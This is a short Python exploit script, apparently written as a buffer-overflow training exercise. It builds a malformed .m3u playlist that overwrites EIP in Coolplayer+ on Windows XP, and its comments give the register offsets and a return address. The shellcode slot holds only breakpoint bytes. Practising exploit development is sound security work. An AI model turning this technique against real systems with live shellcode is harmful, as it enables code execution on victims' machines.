#!/usr/bin/python

# Author: Michael Music
# Date: 8/2/2019
# Description: Coolplayer+ Buffer Overflow Exploit
#  Exercise in BOFs following the securitysift guide
#  Tested on Windows XP
# Notes:
#  I will be assuming that no JMP EBX instruction exist.
#   As such, I will be using the push EBX, ret instruction to jump to my shellcode.
#  App must be installed, launched at C:/
#  m3u file must be located at C:/

# EIP at offset 260
# ESP at offset 264
# EDX at offset 0
# EBX at offset 0
# push EBX, ret at 77a87220

exploit_string = ''

# Start of buffer, which should contains shellcode
exploit_string += '\xcc' * 260

# EIP, which should be an address for push EBX, ret
exploit_string += '\x20\x72\xa8\x77'

# Filler to cause the overflow
exploit_string += '\x43' * (10000 - len(exploit_string))

out = 'crash.m3u'

text = open(out, 'w')
text.write(exploit_string)
text.close
